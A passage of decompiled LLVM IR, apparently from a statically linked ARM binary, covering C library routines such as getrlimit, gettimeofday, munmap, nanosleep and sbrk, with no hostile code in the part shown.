  %v1_1628c = sub i32 0, %arg1
  %v3_16290 = load i16, i16* @global_var_233d0.483, align 2
  %v4_16290 = sext i16 %v3_16290 to i32
  store i32 %v4_16290, i32* %r3.global-to-local, align 4
  %v0_16294 = call i32 @__aeabi_read_tp()
  store i32 -1, i32* @r5, align 4
  %v3_1629c = add i32 %v4_16290, %v0_16294
  %v4_1629c = inttoptr i32 %v3_1629c to i32*
  store i32 %v1_1628c, i32* %v4_1629c, align 4
  br label %dec_label_pc_162f8

dec_label_pc_162a4:                               ; preds = %entry
  br i1 false, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_162a4
  store i32 %arg2, i32* %r7.global-to-local, align 4
  %v3_162ac = add i32 %arg2, %arg1
  store i32 %v3_162ac, i32* @sl, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_162a4, %bb
  %v1_162e84 = phi i32 [ %v18_1626c, %dec_label_pc_162a4 ], [ %v3_162ac, %bb ]
  %v0_162e42 = phi i32 [ 141, %dec_label_pc_162a4 ], [ %arg2, %bb ]
  br i1 false, label %dec_label_pc_162f8, label %dec_label_pc_162e4

dec_label_pc_162b8:                               ; preds = %dec_label_pc_162e4
  %v1_162ec = inttoptr i32 %v1_162e4 to i8*
  %v1_162b8 = add i32 %v0_162b8, 8
  %v2_162b8 = inttoptr i32 %v1_162b8 to i16*
  %v3_162b8 = load i16, i16* %v2_162b8, align 2
  %v4_162b8 = zext i16 %v3_162b8 to i32
  %v2_162bc = add i32 %v4_162b8, %v0_162b8
  store i32 %v2_162bc, i32* @r3, align 4
  %v1_162c0 = add i32 %v2_162bc, -1
  %v2_162c0 = inttoptr i32 %v1_162c0 to i8*
  %v3_162c0 = load i8, i8* %v2_162c0, align 1
  %v4_162c0 = zext i8 %v3_162c0 to i32
  store i32 %v4_162c0, i32* @r4, align 4
  %v3_162c4 = call i32 @strlen(i8* %v1_162ec)
  %v0_162c8 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_162c8, i32* @r1, align 4
  %v1_162cc = add i32 %v3_162c4, 1
  store i32 %v1_162cc, i32* @r2, align 4
  %v0_162d0 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_162d0, i32* @r0, align 4
  %v3_162d4 = call i32 @memmove(i32 %v0_162d0, i32 %v0_162c8, i32 %v1_162cc)
  %v0_162d8 = load i32, i32* %r7.global-to-local, align 4
  %v1_162d8 = add i32 %v0_162d8, 8
  %v2_162d8 = inttoptr i32 %v1_162d8 to i16*
  %v3_162d8 = load i16, i16* %v2_162d8, align 2
  %v4_162d8 = zext i16 %v3_162d8 to i32
  store i32 %v4_162d8, i32* %r3.global-to-local, align 4
  %v0_162dc = load i32, i32* @r4, align 4
  %v1_162dc = trunc i32 %v0_162dc to i8
  %v3_162dc = add i32 %v0_162d8, 10
  %v4_162dc = inttoptr i32 %v3_162dc to i8*
  store i8 %v1_162dc, i8* %v4_162dc, align 1
  %v0_162e0 = load i32, i32* %r7.global-to-local, align 4
  %v1_162e0 = load i32, i32* %r3.global-to-local, align 4
  %v2_162e0 = add i32 %v1_162e0, %v0_162e0
  store i32 %v2_162e0, i32* %r7.global-to-local, align 4
  %v1_162e8.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_162e4

dec_label_pc_162e4:                               ; preds = %.thread, %dec_label_pc_162b8
  %v1_162e8 = phi i32 [ %v1_162e8.pre, %dec_label_pc_162b8 ], [ %v1_162e84, %.thread ]
  %v0_162b8 = phi i32 [ %v2_162e0, %dec_label_pc_162b8 ], [ %v0_162e42, %.thread ]
  %v1_162e4 = add i32 %v0_162b8, 10
  store i32 %v1_162e4, i32* %r6.global-to-local, align 4
  %v3_162e8 = icmp ult i32 %v0_162b8, %v1_162e8
  %v1_162f0 = add i32 %v0_162b8, 11
  store i32 %v1_162f0, i32* %r8.global-to-local, align 4
  br i1 %v3_162e8, label %dec_label_pc_162b8, label %dec_label_pc_162f8

dec_label_pc_162f8:                               ; preds = %dec_label_pc_162e4, %.thread, %dec_label_pc_16288
  %v0_162f8 = load i32, i32* @r5, align 4
  store i32 %v6_1626c, i32* @r5, align 4
  store i32 %v18_1626c, i32* @sl, align 4
  ret i32 %v0_162f8

; uselistorder directives
  uselistorder i32 %v1_162e4, { 1, 0 }
  uselistorder i32 %v0_162b8, { 2, 4, 3, 1, 0 }
  uselistorder i32 %v18_1626c, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 3, 1, 4 }
  uselistorder i32* %r6.global-to-local, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @memmove, { 5, 6, 7, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_162e4, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @getdtablesize() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v2_16310 = ptrtoint i32* %stack_var_-16 to i32
  %v2_1631c = call i32 @getrlimit(i32 7, i32 %v2_16310)
  %v1_16320 = icmp slt i32 %v2_1631c, 0
  %v5_16324 = load i32, i32* %stack_var_-16, align 4
  %storemerge = select i1 %v1_16320, i32 256, i32 %v5_16324
  ret i32 %storemerge
}

define i32 @getegid() local_unnamed_addr {
entry:
  %v1_16348 = load i32, i32* @r0, align 4
  ret i32 %v1_16348
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %v1_1635c = load i32, i32* @r0, align 4
  ret i32 %v1_1635c
}

define i32 @getgid(i32 %arg1) local_unnamed_addr {
entry:
  %v1_16370 = load i32, i32* @r0, align 4
  ret i32 %v1_16370
}

define i32 @__GI_getpagesize() local_unnamed_addr {
entry:
  %v4_16380 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 148) to i32*), align 4
  %v1_16384 = inttoptr i32 %v4_16380 to i32*
  %v2_16384 = load i32, i32* %v1_16384, align 4
  %v2_16388 = icmp eq i32 %v2_16384, 0
  br i1 %v2_16388, label %bb, label %bb2

bb:                                               ; preds = %entry
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  %v1_16390 = phi i32 [ %v2_16384, %entry ], [ 4096, %bb ]
  ret i32 %v1_16390

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_163c8, label %dec_label_pc_163b0

dec_label_pc_163b0:                               ; preds = %entry
  %v1_163b4 = sub i32 0, %arg1
  %v3_163b8 = load i16, i16* @global_var_233d0.483, align 2
  %v4_163b8 = sext i16 %v3_163b8 to i32
  %v0_163bc = call i32 @__aeabi_read_tp()
  %v3_163c0 = add i32 %v4_163b8, %v0_163bc
  %v4_163c0 = inttoptr i32 %v3_163c0 to i32*
  store i32 %v1_163b4, i32* %v4_163c0, align 4
  br label %dec_label_pc_163c8

dec_label_pc_163c8:                               ; preds = %entry, %dec_label_pc_163b0
  %v1_163cc = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_163b0 ]
  ret i32 %v1_163cc

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_163c8, { 1, 0 }
}

define i32 @gettimeofday(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_163d4 = load i32, i32* @r7, align 4
  store i32 %v3_163d4, i32* %stack_var_-8, align 4
  %v0_163e0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_163e0, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_163e0, -4095
  br i1 %tmp, label %dec_label_pc_16408, label %dec_label_pc_163f0

dec_label_pc_163f0:                               ; preds = %entry
  %v0_163f4 = call i32 @__aeabi_read_tp()
  %v3_163f8 = load i16, i16* @global_var_233d0.483, align 2
  %v4_163f8 = sext i16 %v3_163f8 to i32
  store i32 %v4_163f8, i32* @r3, align 4
  %v0_163fc = load i32, i32* %r2.global-to-local, align 4
  %v1_163fc = sub i32 0, %v0_163fc
  store i32 %v1_163fc, i32* %r2.global-to-local, align 4
  %v3_16400 = add i32 %v4_163f8, %v0_163f4
  %v4_16400 = inttoptr i32 %v3_16400 to i32*
  store i32 %v1_163fc, i32* %v4_16400, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_16408.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_16408

dec_label_pc_16408:                               ; preds = %entry, %dec_label_pc_163f0
  %v1_1640c = phi i32 [ %v0_163e0, %entry ], [ -1, %dec_label_pc_163f0 ]
  %v2_16408 = phi i32 [ %v3_163d4, %entry ], [ %v2_16408.pre, %dec_label_pc_163f0 ]
  store i32 %v2_16408, i32* @r7, align 4
  ret i32 %v1_1640c

; uselistorder directives
  uselistorder i32 %v0_163e0, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16408, { 1, 0 }
}

define i32 @getuid() local_unnamed_addr {
entry:
  %v1_16424 = load i32, i32* @r0, align 4
  ret i32 %v1_16424
}

define i32 @mremap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_16428 = load i32, i32* @r4, align 4
  store i32 %v3_16428, i32* %stack_var_-12, align 4
  %v0_16438 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_16438, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_16438, -4095
  br i1 %tmp, label %dec_label_pc_16460, label %dec_label_pc_16448

dec_label_pc_16448:                               ; preds = %entry
  %v0_1644c = call i32 @__aeabi_read_tp()
  %v3_16450 = load i16, i16* @global_var_233d0.483, align 2
  %v4_16450 = sext i16 %v3_16450 to i32
  %v0_16454 = load i32, i32* %r2.global-to-local, align 4
  %v1_16454 = sub i32 0, %v0_16454
  store i32 %v1_16454, i32* %r2.global-to-local, align 4
  %v3_16458 = add i32 %v4_16450, %v0_1644c
  %v4_16458 = inttoptr i32 %v3_16458 to i32*
  store i32 %v1_16454, i32* %v4_16458, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_16460.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_16460

dec_label_pc_16460:                               ; preds = %entry, %dec_label_pc_16448
  %v1_16464 = phi i32 [ %v0_16438, %entry ], [ -1, %dec_label_pc_16448 ]
  %v2_16460 = phi i32 [ %v3_16428, %entry ], [ %v2_16460.pre, %dec_label_pc_16448 ]
  store i32 %v2_16460, i32* @r4, align 4
  ret i32 %v1_16464

; uselistorder directives
  uselistorder i32 %v0_16438, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16460, { 1, 0 }
}

define i32 @munmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1646c = load i32, i32* @r7, align 4
  store i32 %v3_1646c, i32* %stack_var_-8, align 4
  %v0_16478 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_16478, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_16478, -4095
  br i1 %tmp, label %dec_label_pc_164a0, label %dec_label_pc_16488

dec_label_pc_16488:                               ; preds = %entry
  %v0_1648c = call i32 @__aeabi_read_tp()
  %v3_16490 = load i16, i16* @global_var_233d0.483, align 2
  %v4_16490 = sext i16 %v3_16490 to i32
  %v0_16494 = load i32, i32* %r2.global-to-local, align 4
  %v1_16494 = sub i32 0, %v0_16494
  store i32 %v1_16494, i32* %r2.global-to-local, align 4
  %v3_16498 = add i32 %v4_16490, %v0_1648c
  %v4_16498 = inttoptr i32 %v3_16498 to i32*
  store i32 %v1_16494, i32* %v4_16498, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_164a0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_164a0

dec_label_pc_164a0:                               ; preds = %entry, %dec_label_pc_16488
  %v1_164a4 = phi i32 [ %v0_16478, %entry ], [ -1, %dec_label_pc_16488 ]
  %v2_164a0 = phi i32 [ %v3_1646c, %entry ], [ %v2_164a0.pre, %dec_label_pc_16488 ]
  store i32 %v2_164a0, i32* @r7, align 4
  ret i32 %v1_164a4

; uselistorder directives
  uselistorder i32 %v0_16478, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_164a0, { 1, 0 }
}

define i32 @__syscall_nanosleep() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_164ac = load i32, i32* @r7, align 4
  store i32 %v3_164ac, i32* %stack_var_-8, align 4
  %v0_164b8 = load i32, i32* @r0, align 4
  store i32 %v0_164b8, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_164b8, -4095
  br i1 %tmp, label %dec_label_pc_164e0, label %dec_label_pc_164c8

dec_label_pc_164c8:                               ; preds = %entry
  %v0_164cc = call i32 @__aeabi_read_tp()
  %v3_164d0 = load i16, i16* @global_var_233d0.483, align 2
  %v4_164d0 = sext i16 %v3_164d0 to i32
  %v0_164d4 = load i32, i32* %r2.global-to-local, align 4
  %v1_164d4 = sub i32 0, %v0_164d4
  store i32 %v1_164d4, i32* %r2.global-to-local, align 4
  %v3_164d8 = add i32 %v4_164d0, %v0_164cc
  %v4_164d8 = inttoptr i32 %v3_164d8 to i32*
  store i32 %v1_164d4, i32* %v4_164d8, align 4
  %v2_164e0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_164e0

dec_label_pc_164e0:                               ; preds = %entry, %dec_label_pc_164c8
  %v1_164e4 = phi i32 [ %v0_164b8, %entry ], [ -1, %dec_label_pc_164c8 ]
  %v2_164e0 = phi i32 [ %v3_164ac, %entry ], [ %v2_164e0.pre, %dec_label_pc_164c8 ]
  store i32 %v2_164e0, i32* @r7, align 4
  ret i32 %v1_164e4

; uselistorder directives
  uselistorder i32 %v0_164b8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_164e0, { 1, 0 }
}

define i32 @__libc_nanosleep(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v4_164f8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 13032) to i32*), align 4
  %v2_164fc = icmp eq i32 %v4_164f8, 0
  %v3_16500 = load i32, i32* @r4, align 4
  %v9_16500 = load i32, i32* @r6, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_164fc, label %dec_label_pc_16510, label %entry.dec_label_pc_16518_crit_edge

entry.dec_label_pc_16518_crit_edge:               ; preds = %entry
  br label %dec_label_pc_16518

dec_label_pc_16510:                               ; preds = %entry
  store i32 %v3_16500, i32* @r4, align 4
  store i32 %v9_16500, i32* @r6, align 4
  %v0_16514 = call i32 @__syscall_nanosleep()
  br label %dec_label_pc_16518

dec_label_pc_16518:                               ; preds = %entry.dec_label_pc_16518_crit_edge, %dec_label_pc_16510
  %v0_16518 = call i32 @__libc_enable_asynccancel()
  %v0_1651c = load i32, i32* @r6, align 4
  store i32 %v0_1651c, i32* @r1, align 4
  store i32 %v0_16518, i32* @r5, align 4
  %v0_16524 = load i32, i32* @r4, align 4
  store i32 %v0_16524, i32* @r0, align 4
  %v0_16528 = call i32 @__syscall_nanosleep()
  store i32 %v0_16528, i32* @r4, align 4
  %v0_16530 = load i32, i32* @r5, align 4
  %v1_16534 = call i32 @__libc_disable_asynccancel(i32 %v0_16530)
  %v0_16538 = load i32, i32* @r4, align 4
  ret i32 %v0_16538

; uselistorder directives
  uselistorder i32 (i32)* @__libc_disable_asynccancel, { 7, 10, 13, 1, 6, 8, 5, 9, 4, 3, 12, 2, 11, 0 }
  uselistorder i32 ()* @__libc_enable_asynccancel, { 7, 10, 13, 1, 6, 8, 5, 9, 4, 3, 12, 2, 11, 0 }
  uselistorder label %dec_label_pc_16518, { 1, 0 }
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1654c = load i32, i32* @r4, align 4
  store i32 %v3_1654c, i32* %stack_var_-16, align 4
  store i32 11580, i32* %r6.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23378.488 to i32), i32* %r4.global-to-local, align 4
  %v4_1655c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 11580) to i32*), align 4
  %v2_16560 = icmp eq i32 %v4_1655c, 0
  store i32 %arg1, i32* %r5.global-to-local, align 4
  br i1 %v2_16560, label %dec_label_pc_1656c, label %dec_label_pc_1657c

dec_label_pc_1656c:                               ; preds = %entry
  %v1_16570 = call i32 @__GI_brk(i32 0)
  %v1_16574 = icmp slt i32 %v1_16570, 0
  br i1 %v1_16574, label %dec_label_pc_165a0, label %dec_label_pc_1657cthread-pre-split

dec_label_pc_1657cthread-pre-split:               ; preds = %dec_label_pc_1656c
  %v0_16580.pr = load i32, i32* %r5.global-to-local, align 4
  %v0_1657c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1657c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1657c

dec_label_pc_1657c:                               ; preds = %dec_label_pc_1657cthread-pre-split, %entry
  %v1_1657c = phi i32 [ %v1_1657c.pre, %dec_label_pc_1657cthread-pre-split ], [ 11580, %entry ]
  %v0_1657c = phi i32 [ %v0_1657c.pre, %dec_label_pc_1657cthread-pre-split ], [ ptrtoint (i32* @global_var_23378.488 to i32), %entry ]
  %v1_16590 = phi i32 [ %v0_16580.pr, %dec_label_pc_1657cthread-pre-split ], [ %arg1, %entry ]
  %v2_1657c = add i32 %v0_1657c, %v1_1657c
  %v3_1657c = inttoptr i32 %v2_1657c to i32*
  %v4_1657c = load i32, i32* %v3_1657c, align 4
  %v2_16580 = icmp eq i32 %v1_16590, 0
  store i32 %v4_1657c, i32* %r4.global-to-local, align 4
  br i1 %v2_16580, label %dec_label_pc_165a4, label %dec_label_pc_1658c

dec_label_pc_1658c:                               ; preds = %dec_label_pc_1657c
  %v2_16590 = add i32 %v4_1657c, %v1_16590
  %v1_16594 = call i32 @__GI_brk(i32 %v2_16590)
  %v1_16598 = icmp slt i32 %v1_16594, 0
  br i1 %v1_16598, label %dec_label_pc_165a0, label %dec_label_pc_1658c.dec_label_pc_165a4_crit_edge

dec_label_pc_1658c.dec_label_pc_165a4_crit_edge:  ; preds = %dec_label_pc_1658c
  %v0_165a4.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_165a4

dec_label_pc_165a0:                               ; preds = %dec_label_pc_1658c, %dec_label_pc_1656c
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_165a4

dec_label_pc_165a4:                               ; preds = %dec_label_pc_1657c, %dec_label_pc_1658c.dec_label_pc_165a4_crit_edge, %dec_label_pc_165a0
  %v0_165a4 = phi i32 [ %v0_165a4.pre, %dec_label_pc_1658c.dec_label_pc_165a4_crit_edge ], [ -1, %dec_label_pc_165a0 ], [ %v4_1657c, %dec_label_pc_1657c ]
  %v2_165a8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_165a8, i32* @r4, align 4
  ret i32 %v0_165a4

; uselistorder directives
  uselistorder i32 %v4_1657c, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_brk, { 1, 0 }
  uselistorder label %dec_label_pc_165a4, { 2, 1, 0 }
}

define i32 @times(i32 %arg1) local_unnamed_addr {
entry:
  %v1_165c8 = load i32, i32* @r0, align 4
  ret i32 %v1_165c8
}

define i32 @__xstat64_conv(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_165cc = load i32, i32* @r4, align 4
  store i32 %v3_165cc, i32* %stack_var_-24, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 104, i32* %r2.global-to-local, align 4
  %v3_165e4 = inttoptr i32 %arg2 to i8*
  %v4_165e4 = call i32 @__GI_memset(i8* %v3_165e4, i32 0, i32 104)
  %v2_165e8 = load i32, i32* %arg1, align 4
  store i32 %v2_165e8, i32* %r3.global-to-local, align 4
  %v3_165e8 = add i32 %tmp, 4
  %v4_165e8 = inttoptr i32 %v3_165e8 to i32*
  %v5_165e8 = load i32, i32* %v4_165e8, align 4
  store i32 %v5_165e8, i32* %r4.global-to-local, align 4
  %v0_165ec = load i32, i32* %r5.global-to-local, align 4
  %v1_165ec = inttoptr i32 %v0_165ec to i32*
  store i32 %v2_165e8, i32* %v1_165ec, align 4
  %v3_165ec = add i32 %v0_165ec, 4
  %v4_165ec = inttoptr i32 %v3_165ec to i32*
  %v5_165ec = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_165ec, i32* %v4_165ec, align 4
  %v0_165f0 = load i32, i32* %r6.global-to-local, align 4
  %v1_165f0 = add i32 %v0_165f0, 12
  %v2_165f0 = inttoptr i32 %v1_165f0 to i32*
  %v3_165f0 = load i32, i32* %v2_165f0, align 4
  %v1_165f4 = load i32, i32* %r5.global-to-local, align 4
  %v2_165f4 = add i32 %v1_165f4, 12
  %v3_165f4 = inttoptr i32 %v2_165f4 to i32*
  store i32 %v3_165f0, i32* %v3_165f4, align 4
  %v0_165f8 = load i32, i32* %r6.global-to-local, align 4
  %v1_165f8 = add i32 %v0_165f8, 96
  store i32 %v1_165f8, i32* %r3.global-to-local, align 4
  %v1_165fc = inttoptr i32 %v1_165f8 to i32*
  %v2_165fc = load i32, i32* %v1_165fc, align 4
  store i32 %v2_165fc, i32* %r3.global-to-local, align 4
  %v3_165fc = add i32 %v0_165f8, 100
  %v4_165fc = inttoptr i32 %v3_165fc to i32*
  %v5_165fc = load i32, i32* %v4_165fc, align 4
  store i32 %v5_165fc, i32* %r4.global-to-local, align 4
  %v1_16600 = add i32 %v0_165f8, 56
  %v2_16600 = inttoptr i32 %v1_16600 to i32*
  %v3_16600 = load i32, i32* %v2_16600, align 4
  store i32 %v3_16600, i32* %r2.global-to-local, align 4
  %v1_16604 = load i32, i32* %r5.global-to-local, align 4
  %v2_16604 = add i32 %v1_16604, 96
  %v3_16604 = inttoptr i32 %v2_16604 to i32*
  store i32 %v2_165fc, i32* %v3_16604, align 4
  %v0_16608 = load i32, i32* %r4.global-to-local, align 4
  %v1_16608 = load i32, i32* %r5.global-to-local, align 4
  %v2_16608 = add i32 %v1_16608, 100
  %v3_16608 = inttoptr i32 %v2_16608 to i32*
  store i32 %v0_16608, i32* %v3_16608, align 4
  %v0_1660c = load i32, i32* %r6.global-to-local, align 4
  %v1_1660c = add i32 %v0_1660c, 24
  store i32 %v1_1660c, i32* %ip.global-to-local, align 4
  %v1_16610 = inttoptr i32 %v1_1660c to i32*
  %v2_16610 = load i32, i32* %v1_16610, align 4
  store i32 %v2_16610, i32* %ip.global-to-local, align 4
  %v3_16610 = add i32 %v0_1660c, 28
  %v4_16610 = inttoptr i32 %v3_16610 to i32*
  %v5_16610 = load i32, i32* %v4_16610, align 4
  store i32 %v5_16610, i32* %lr.global-to-local, align 4
  %v0_16614 = load i32, i32* %r2.global-to-local, align 4
  %v1_16614 = load i32, i32* %r5.global-to-local, align 4
  %v2_16614 = add i32 %v1_16614, 56
  %v3_16614 = inttoptr i32 %v2_16614 to i32*
  store i32 %v0_16614, i32* %v3_16614, align 4
  %v0_16618 = load i32, i32* %r6.global-to-local, align 4
  %v1_16618 = add i32 %v0_16618, 72
  store i32 %v1_16618, i32* %r3.global-to-local, align 4
  %v1_1661c = add i32 %v0_16618, 32
  store i32 %v1_1661c, i32* %r7.global-to-local, align 4
  %v1_16620 = inttoptr i32 %v1_1661c to i32*
  %v2_16620 = load i32, i32* %v1_16620, align 4
  store i32 %v2_16620, i32* %r7.global-to-local, align 4
  %v3_16620 = add i32 %v0_16618, 36
  %v4_16620 = inttoptr i32 %v3_16620 to i32*
  %v5_16620 = load i32, i32* %v4_16620, align 4
  store i32 %v5_16620, i32* %r8.global-to-local, align 4
  %v1_16624 = inttoptr i32 %v1_16618 to i32*
  %v2_16624 = load i32, i32* %v1_16624, align 4
  %v3_16624 = add i32 %v0_16618, 76
  %v4_16624 = inttoptr i32 %v3_16624 to i32*
  %v5_16624 = load i32, i32* %v4_16624, align 4
  store i32 %v5_16624, i32* %r1.global-to-local, align 4
  %v0_16628 = load i32, i32* %r5.global-to-local, align 4
  %v1_16628 = add i32 %v0_16628, 72
  %v1_1662c = inttoptr i32 %v1_16628 to i32*
  store i32 %v2_16624, i32* %v1_1662c, align 4
  %v3_1662c = add i32 %v0_16628, 76
  %v4_1662c = inttoptr i32 %v3_1662c to i32*
  %v5_1662c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1662c, i32* %v4_1662c, align 4
  %v0_16630 = load i32, i32* %r7.global-to-local, align 4
  %v1_16630 = load i32, i32* %r5.global-to-local, align 4
  %v2_16630 = add i32 %v1_16630, 32
  %v3_16630 = inttoptr i32 %v2_16630 to i32*
  store i32 %v0_16630, i32* %v3_16630, align 4
  %v0_16634 = load i32, i32* %r8.global-to-local, align 4
  %v1_16634 = load i32, i32* %r5.global-to-local, align 4
  %v2_16634 = add i32 %v1_16634, 36
  %v3_16634 = inttoptr i32 %v2_16634 to i32*
  store i32 %v0_16634, i32* %v3_16634, align 4
  %v0_16638 = load i32, i32* %r6.global-to-local, align 4
  %v1_16638 = add i32 %v0_16638, 80
  store i32 %v1_16638, i32* %r3.global-to-local, align 4
  %v1_1663c = add i32 %v0_16638, 48
  store i32 %v1_1663c, i32* %r7.global-to-local, align 4
  %v1_16640 = inttoptr i32 %v1_1663c to i32*
  %v2_16640 = load i32, i32* %v1_16640, align 4
  store i32 %v2_16640, i32* %r7.global-to-local, align 4
  %v3_16640 = add i32 %v0_16638, 52
  %v4_16640 = inttoptr i32 %v3_16640 to i32*
  %v5_16640 = load i32, i32* %v4_16640, align 4
  store i32 %v5_16640, i32* %r8.global-to-local, align 4
  %v1_16644 = inttoptr i32 %v1_16638 to i32*
  %v2_16644 = load i32, i32* %v1_16644, align 4
  %v3_16644 = add i32 %v0_16638, 84
  %v4_16644 = inttoptr i32 %v3_16644 to i32*
  %v5_16644 = load i32, i32* %v4_16644, align 4
  store i32 %v5_16644, i32* %r1.global-to-local, align 4
  %v1_16648 = add i32 %v0_16638, 16
  %v2_16648 = inttoptr i32 %v1_16648 to i32*
  %v3_16648 = load i32, i32* %v2_16648, align 4
  store i32 %v3_16648, i32* %r2.global-to-local, align 4
  %v0_1664c = load i32, i32* %r5.global-to-local, align 4
  %v1_1664c = add i32 %v0_1664c, 80
  %v1_16650 = inttoptr i32 %v1_1664c to i32*
  store i32 %v2_16644, i32* %v1_16650, align 4
  %v3_16650 = add i32 %v0_1664c, 84
  %v4_16650 = inttoptr i32 %v3_16650 to i32*
  %v5_16650 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_16650, i32* %v4_16650, align 4
  %v0_16654 = load i32, i32* %r7.global-to-local, align 4
  %v1_16654 = load i32, i32* %r5.global-to-local, align 4
  %v2_16654 = add i32 %v1_16654, 48
  %v3_16654 = inttoptr i32 %v2_16654 to i32*
  store i32 %v0_16654, i32* %v3_16654, align 4
  %v0_16658 = load i32, i32* %r8.global-to-local, align 4
  %v1_16658 = load i32, i32* %r5.global-to-local, align 4
  %v2_16658 = add i32 %v1_16658, 52
  %v3_16658 = inttoptr i32 %v2_16658 to i32*
  store i32 %v0_16658, i32* %v3_16658, align 4
  %v0_1665c = load i32, i32* %r2.global-to-local, align 4
  %v1_1665c = load i32, i32* %r5.global-to-local, align 4
  %v2_1665c = add i32 %v1_1665c, 16
  %v3_1665c = inttoptr i32 %v2_1665c to i32*
  store i32 %v0_1665c, i32* %v3_1665c, align 4
  %v0_16660 = load i32, i32* %r6.global-to-local, align 4
  %v1_16660 = add i32 %v0_16660, 88
  store i32 %v1_16660, i32* %r3.global-to-local, align 4
  %v1_16664 = add i32 %v0_16660, 20
  %v2_16664 = inttoptr i32 %v1_16664 to i32*
  %v3_16664 = load i32, i32* %v2_16664, align 4
  store i32 %v3_16664, i32* %r2.global-to-local, align 4
  %v1_16668 = inttoptr i32 %v1_16660 to i32*
  %v2_16668 = load i32, i32* %v1_16668, align 4
